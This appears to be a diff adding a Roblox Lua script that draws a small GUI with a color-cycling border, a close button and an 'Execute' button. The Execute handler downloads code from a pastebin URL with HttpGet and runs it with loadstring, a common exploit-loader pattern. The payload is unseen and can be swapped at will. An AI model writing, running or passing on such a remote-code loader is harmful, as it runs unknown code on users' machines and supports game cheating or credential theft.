@@ -1,0 +1,63 @@
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SmallBlackGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a Frame for the border
+local border = Instance.new("Frame")
+border.Size = UDim2.new(0, 210, 0, 110) -- Slightly larger than the main frame
+border.Position = UDim2.new(0.5, -105, 0.5, -55) -- Centered on the screen
+border.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red color for visibility
+border.BackgroundTransparency = 0.5 -- Make it semi-transparent to see the color change
+border.Parent = screenGui
+
+-- Create a Frame for the main GUI
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100) -- Size of the main frame
+frame.Position = UDim2.new(0.5, -100, 0.5, -50) -- Centered on the screen
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black color
+frame.BorderSizePixel = 0 -- Remove border
+frame.Parent = screenGui
+
+-- Optional: Add a Close Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 50, 0, 25) -- Size of the button
+closeButton.Position = UDim2.new(1, -60, 0, 5) -- Position on the frame
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red color for visibility
+closeButton.Text = "X" -- Close button text
+closeButton.Parent = frame
+
+-- Close button functionality
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy() -- Destroy the GUI when clicked
+end)
+
+-- Create an Execute Button
+local executeButton = Instance.new("TextButton")
+executeButton.Size = UDim2.new(0, 100, 0, 25) -- Size of the execute button
+executeButton.Position = UDim2.new(0.5, -50, 0.5, 0) -- Centered in the frame
+executeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green color for visibility
+executeButton.Text = "Execute" -- Execute button text
+executeButton.Parent = frame
+
+-- Execute button functionality
+executeButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/WuFL67wN"))() -- Execute the code
+end)
+
+-- Function to change border color dynamically
+local function changeBorderColor()
+    while true do
+        for i = 0, 255, 5 do
+            border.BackgroundColor3 = Color3.fromRGB(i, 0, 255 - i) -- Gradual color change
+            wait(0.05) -- Wait to create a smooth transition
+        end
+        for i = 255, 0, -5 do
+            border.BackgroundColor3 = Color3.fromRGB(i, 0, 255 - i) -- Gradual color change
+            wait(0.05) -- Wait to create a smooth transition
+        end
+    end
+end
+
+-- Start the border color changing function
+changeBorderColor()
